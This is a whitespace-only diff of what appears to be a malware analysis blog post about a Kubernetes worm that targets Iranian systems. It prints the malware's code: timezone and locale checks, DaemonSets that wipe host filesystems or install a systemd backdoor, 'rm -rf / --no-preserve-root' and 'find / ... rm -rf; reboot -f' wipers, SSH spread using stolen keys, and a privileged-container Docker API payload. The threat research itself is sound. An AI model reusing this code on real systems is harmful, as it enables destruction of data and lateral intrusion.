@@ -77,31 +77,31 @@ rm -- "$0"
 What you can see is that it downloadskubectlif it's not already installed. Then it downloadskube.pyfrom the same host, and executes that, before then deleting itself. The real interesting code is contained within that. Here's the last few lines of the script, which clearly outlines the intent of the code, which we will break down further:
 
 if
- __name__ == 
+ __name__ ==
 "__main__"
 :
 
- 
+
 if
  is_k8s():
 
- 
+
 if
  is_iran():
 
  deploy_destructive_ds()
 
- 
+
 else
 :
 
  deploy_std_ds()
 
- 
+
 else
 :
 
- 
+
 if
  is_iran():
 
@@ -117,15 +117,15 @@ The first thing the payload does is figure out where it's running. Two checks:
 
 def is_k8s():
 
- 
+
 return
  os.path.exists(
 "/var/run/secrets/kubernetes.io/serviceaccount"
 ) or \
 
- 
+
 "KUBERNETES_SERVICE_HOST"
- 
+
 in
  os.environ
 
@@ -135,72 +135,72 @@ Then this:
 
 def is_iran():
 
- tz = 
+ tz =
 ""
 
- 
+
 if
  os.path.exists(
 "/etc/timezone"
 ):
 
- 
+
 with
  open(
 "/etc/timezone"
-, 
+,
 "r"
-) 
+)
 as
  f:
 
  tz = f.read().strip()
 
- 
+
 else
 :
 
- 
+
 try
 :
 
  tz = subprocess.check_output([
 "timedatectl"
-, 
+,
 "show"
-, 
+,
 "--property=Timezone"
-, 
+,
 "--value"
-], 
+],
 
  stderr=subprocess.DEVNULL).decode().strip()
 
- 
+
 except
 :
 
  pass
 
- 
+
 
  lang = os.environ.get(
 "LANG"
-, 
+,
 ""
 )
 
- 
+
 return
- tz 
+ tz
 in
  [
 "Asia/Tehran"
-, 
+,
 "Iran"
-] or 
+] or
 "fa_IR"
- 
+
 in
  lang
 
@@ -222,27 +222,27 @@ The Iranian-targeted DaemonSet is calledhost-provisioner-iran. The container ins
 ‍
 
 def
- 
+
 deploy_destructive_ds
 ():
 
- ds_name = 
+ ds_name =
 "host-provisioner-iran"
 
- 
+
 if
  run_cmd(
-f"kubectl get ds 
+f"kubectl get ds
 {ds_name}
  -n kube-system"
-).returncode == 
+).returncode ==
 0
 :
 
- 
+
 return
 
- yaml = 
+ yaml =
 f"""
 
 apiVersion: apps/v1
@@ -251,7 +251,7 @@ kind: DaemonSet
 
 metadata:
 
- name: 
+ name:
 {ds_name}
 
  namespace: kube-system
@@ -262,7 +262,7 @@ spec:
 
  matchLabels:
 
- name: 
+ name:
 {ds_name}
 
  template:
@@ -271,7 +271,7 @@ spec:
 
  labels:
 
- name: 
+ name:
 {ds_name}
 
  spec:
@@ -322,13 +322,13 @@ spec:
 
  subprocess.run([
 "kubectl"
-, 
+,
 "apply"
-, 
+,
 "-f"
-, 
+,
 "-"
-], 
+],
 input
 =yaml.encode())
 
@@ -339,27 +339,27 @@ The DaemonSet mounts the host's root filesystem to/mnt/host, deletes everything 
 For non-Iranian targets, the DaemonSet (host-provisioner-std) is less dramatic but more operationally useful. It writes the CanisterWorm backdoor to every node and registers it as a systemd service:
 
 def
- 
+
 deploy_std_ds
 ():
 
- ds_name = 
+ ds_name =
 "host-provisioner-std"
 
- 
+
 if
  run_cmd(
-f"kubectl get ds 
+f"kubectl get ds
 {ds_name}
  -n kube-system"
-).returncode == 
+).returncode ==
 0
 :
 
- 
+
 return
 
- yaml = 
+ yaml =
 f"""
 
 apiVersion: apps/v1
@@ -368,7 +368,7 @@ kind: DaemonSet
 
 metadata:
 
- name: 
+ name:
 {ds_name}
 
  namespace: kube-system
@@ -379,7 +379,7 @@ spec:
 
  matchLabels:
 
- name: 
+ name:
 {ds_name}
 
  template:
@@ -388,7 +388,7 @@ spec:
 
  labels:
 
- name: 
+ name:
 {ds_name}
 
  spec:
@@ -446,7 +446,7 @@ spec:
 
  [Service]
 
- ExecStart=/usr/bin/python3 
+ ExecStart=/usr/bin/python3
 {CONFIG[
 'TARGET_DIR'
 ]}
@@ -464,7 +464,7 @@ spec:
 
  chroot /mnt/host systemctl daemon-reload
 
- chroot /mnt/host systemctl enable --now 
+ chroot /mnt/host systemctl enable --now
 {CONFIG[
 'SVC_NAME'
 ]}
@@ -489,13 +489,13 @@ spec:
 
  subprocess.run([
 "kubectl"
-, 
+,
 "apply"
-, 
+,
 "-f"
-, 
+,
 "-"
-], 
+],
 input
 =yaml.encode())
 
@@ -506,29 +506,29 @@ The backdoor is the same one we documented in the CanisterWorm post. It polls th
 For non-Kubernetes Iranian systems, the approach is cruder:
 
 def
- 
+
 poison_pill
 ():
 
- cmd = 
+ cmd =
 "rm -rf / --no-preserve-root"
 
- 
+
 if
- os.getuid() == 
+ os.getuid() ==
 0
 :
 
  os.system(cmd)
 
- 
+
 else
 :
 
  os.system(
-f"sudo -n 
+f"sudo -n
 {cmd}
- 2>/dev/null || 
+ 2>/dev/null ||
 {cmd}
 "
 )
@@ -565,51 +565,51 @@ The previous versions relied on DaemonSets to move across a cluster. This varian
 Here's how it finds machines to hit:
 
 def
- 
+
 get_accepted_targets
 ():
 
  targets = {}
 
- 
+
 for
- path 
+ path
 in
  [
 "/var/log/auth.log"
-, 
+,
 "/var/log/secure"
 ]:
 
- 
+
 if
  os.path.exists(path):
 
- 
+
 try
 :
 
- 
+
 with
- 
+
 open
-(path, 
+(path,
 "r"
-) 
+)
 as
  f:
 
- 
+
 for
- line 
+ line
 in
  f:
 
- 
+
 if
- 
+
 "Accepted"
- 
+
 in
  line:
 
@@ -617,34 +617,34 @@ in
 r'Accepted \S+ for (\S+) from (\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)'
 , line)
 
- 
+
 if
  match:
 
  user, ip = match.groups()
 
- 
+
 if
- ip 
+ ip
 not
- 
+
 in
  targets: targets[ip] = []
 
- 
+
 if
- user 
+ user
 not
- 
+
 in
  targets[ip]: targets[ip].append(user)
 
- 
+
 except
-: 
+:
 pass
 
- 
+
 return
  targets
 
@@ -659,19 +659,19 @@ ssh_base = os.path.expanduser(
 )
 
 for
- t 
+ t
 in
  [
 "id_rsa"
-, 
+,
 "id_ed25519"
-, 
+,
 "id_ecdsa"
 ]:
 
  p = os.path.join(ssh_base, t)
 
- 
+
 if
  os.path.exists(p): keys.append(p)
 
@@ -679,23 +679,23 @@ For each target, it checks two ports. Port 22 gets the SSH spread:
 
 cmd = [
 "ssh"
-, 
+,
 "-o"
-, 
+,
 "StrictHostKeyChecking=no"
-, 
+,
 "-o"
-, 
+,
 "PasswordAuthentication=no"
 ,
 
- 
+
 "-o"
-, 
+,
 "ConnectTimeout=5"
-, 
+,
 "-i"
-, k, 
+, k,
 f"
 {user}
 @
@@ -703,8 +703,8 @@ f"
 "
 ,
 
- 
-f"echo 
+
+f"echo
 {b64_logic}
  | base64 -d | bash"
 ]
@@ -713,37 +713,37 @@ Port 2375 gets the Docker API exploit, creating a privileged container with the 
 
 payload = {
 
- 
+
 "Image"
-: 
+:
 "alpine:latest"
 ,
 
- 
+
 "Cmd"
 : [
 "/bin/sh"
-, 
+,
 "-c"
-, 
+,
 f"chroot /mnt/host /bin/sh -c '
 {logic}
 '"
 ],
 
- 
+
 "HostConfig"
 : {
 "Binds"
 : [
 "/:/mnt/host"
-], 
+],
 "Privileged"
-: 
+:
 True
-, 
+,
 "NetworkMode"
-: 
+:
 "host"
 }
 
@@ -751,11 +751,11 @@ True
 
 conn.request(
 "POST"
-, 
+,
 "/containers/create"
 , json.dumps(payload), {
 "Content-Type"
-: 
+:
 "application/json"
 })
 
@@ -763,11 +763,11 @@ Both paths deliver the sameget_remote_logic()payload, which runs the Iran timezo
 
 The wiper itself changed. The earlier versions usedrm -rf / --no-preserve-rooton non-K8s hosts, while the DaemonSet variant usedfind / -maxdepth 1 ... -exec rm -rf {} +with a forced reboot. This version standardises on thefindapproach withreboot -facross the board:
 
-find / -maxdepth 1 -not -name 
+find / -maxdepth 1 -not -name
 'mnt'
  -
 exec
- rm -rf {} + || 
+ rm -rf {} + ||
 true
 ; reboot -f
 
@@ -828,7 +828,7 @@ No CC required
 4.7/
 5
 Tired of false positives? 
-Try Aikido like 
+Try Aikido like
 100k others.
 Start Now
 Get a personalized walkthrough
